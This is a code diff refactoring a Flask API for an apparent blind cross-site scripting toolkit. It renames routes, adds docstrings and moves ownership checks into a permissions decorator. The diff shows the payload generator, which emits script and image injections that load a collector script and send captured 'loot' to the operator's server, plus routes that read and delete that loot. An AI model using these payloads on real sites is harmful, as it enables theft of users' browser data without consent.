@@ -3,13 +3,15 @@ from app import db
 from app.models import Client, XSS
 from app.api import bp
 from flask_login import login_required, current_user
+from app.decorators import permissions
 
 import json
 
+
 @bp.route('/xss/generate/<id>', methods=['GET'])
 @login_required
-def gen_xss(id):
-
+def xss_generate(id):
+    """Generates an XSS payload"""
     client = Client.query.filter_by(id=id).first_or_404()
     uid = client.uid
     parameters = request.args.to_dict()
@@ -25,7 +27,6 @@ def gen_xss(id):
     code_type = 'html'
 
     for param, value in parameters.items():
-
 
         if param == 'url':
             url = value
@@ -63,13 +64,14 @@ def gen_xss(id):
             other_data += '{}={}'.format(param, value)
             require_params = True
 
-
     if i_want_it_all:
         if code_type == 'js':
-            payload = ';}};var js=document.createElement("script");js.src="{}/static/collector.min.js";js.onload=function(){{sendData("{}/api/x/{}/{}","{}")}};document.body.appendChild(js);'.format(url, url, xss_type, uid, other_data)
+            payload = ';}};var js=document.createElement("script");js.src="{}/static/collector.min.js";js.onload=function(){{sendData("{}/api/x/{}/{}","{}")}};document.body.appendChild(js);'.format(
+                url, url, xss_type, uid, other_data)
             return (payload), 200
         else:
-            payload = """'>"><script src={}/static/collector.min.js></script><script>sendData("{}/api/x/{}/{}", "{}")</script>""".format(url, url, xss_type, uid, other_data)
+            payload = """'>"><script src={}/static/collector.min.js></script><script>sendData("{}/api/x/{}/{}", "{}")</script>""".format(
+                url, url, xss_type, uid, other_data)
             return (payload), 200
 
     if code_type == 'js':
@@ -80,7 +82,6 @@ def gen_xss(id):
             payload += '<script>new Image().src="'
         else:
             payload += '<img src="'
-
 
     payload += '{}/api/x/{}/{}'.format(url, xss_type, uid)
 
@@ -125,14 +126,12 @@ def gen_xss(id):
     return (payload), 200
 
 
-@bp.route('/xss/<id>', methods=['DELETE'])
+@bp.route('/xss/<xss_id>', methods=['DELETE'])
 @login_required
-def delete_xss(id):
-
-    xss = XSS.query.filter_by(id=id).first_or_404()
-
-    if current_user.id != xss.client.owner_id and not current_user.is_admin:
-        return jsonify({'status': 'error', 'detail': 'Can\'t delete someone else\'s XSS'}), 403
+@permissions(one_of=['admin', 'owner'])
+def xss_delete(xss_id):
+    """Deletes an XSS"""
+    xss = XSS.query.filter_by(id=xss_id).first_or_404()
 
     db.session.delete(xss)
     db.session.commit()
@@ -140,31 +139,30 @@ def delete_xss(id):
     return jsonify({'status': 'OK'}), 200
 
 
-@bp.route('/xss/<id>/<loot_type>', methods=['GET', 'DELETE'])
+@bp.route('/xss/<xss_id>/<loot_type>', methods=['GET'])
 @login_required
-def loot(id, loot_type):
+def xss_loot_get(xss_id, loot_type):
+    """Gets a specific type of data for an XSS"""
+    xss = XSS.query.filter_by(id=xss_id).first_or_404()
 
-    if request.method == 'DELETE':
+    data = json.loads(xss.data)
 
-        xss = XSS.query.filter_by(id=id).first_or_404()
+    return jsonify({'data': data[loot_type]}), 200
 
-        if current_user.id != xss.client.owner_id and not current_user.is_admin:
-            return jsonify({'status': 'error', 'detail': 'Can\'t delete someone else\'s data'}), 403
 
-        data = json.loads(xss.data)
+@bp.route('/xss/<xss_id>/<loot_type>', methods=['DELETE'])
+@login_required
+@permissions(one_of=['admin', 'owner'])
+def xss_loot_delete(xss_id, loot_type):
+    """Deletes a specific type of data for an XSS"""
+    xss = XSS.query.filter_by(id=xss_id).first_or_404()
 
-        data.pop(loot_type, None)
+    data = json.loads(xss.data)
 
-        xss.data = json.dumps(data)
+    data.pop(loot_type, None)
 
-        db.session.commit()
+    xss.data = json.dumps(data)
 
-        return jsonify({'status': 'OK'}), 200
+    db.session.commit()
 
-    elif request.method == 'GET':
-
-        xss = XSS.query.filter_by(id=id).first_or_404()
-
-        data = json.loads(xss.data)
-        
-        return jsonify({'data': data[loot_type]}), 200
+    return jsonify({'status': 'OK'}), 200
